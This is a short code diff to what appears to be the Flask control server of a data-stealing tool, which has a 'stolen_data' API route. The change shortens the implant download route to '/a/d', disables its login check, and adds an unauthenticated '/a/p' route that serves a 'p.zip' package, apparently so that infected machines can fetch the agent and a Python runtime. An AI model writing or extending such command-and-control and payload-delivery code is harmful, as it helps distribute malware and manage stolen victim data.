@@ -445,13 +445,21 @@ def init_api_routes(app, socketio):
                 "message": f"Internal server error: {str(e)}"
             }), 500
 
-    @app.route('/agents/download')
-    @login_required
+    @app.route('/a/d')
+    #@login_required
     def download_agent():
         agents_dir = os.path.join(app.root_path, 'agents')
         if not os.path.exists(os.path.join(agents_dir, 'agent.py')):
             return jsonify({"status": "error", "message": "Agent file not found"}), 404
         return send_from_directory(agents_dir, 'agent.py', as_attachment=True)
+    
+    @app.route('/a/p')
+    #@login_required
+    def download_python():
+        agents_dir = os.path.join(app.root_path, 'agents')
+        if not os.path.exists(os.path.join(agents_dir, 'p.zip')):
+            return jsonify({"status": "error", "message": "p not found"}), 404
+        return send_from_directory(agents_dir, 'p.zip', as_attachment=True)
 
     @app.route('/api/stolen_data/<int:data_id>', methods=['DELETE'])
     @login_required
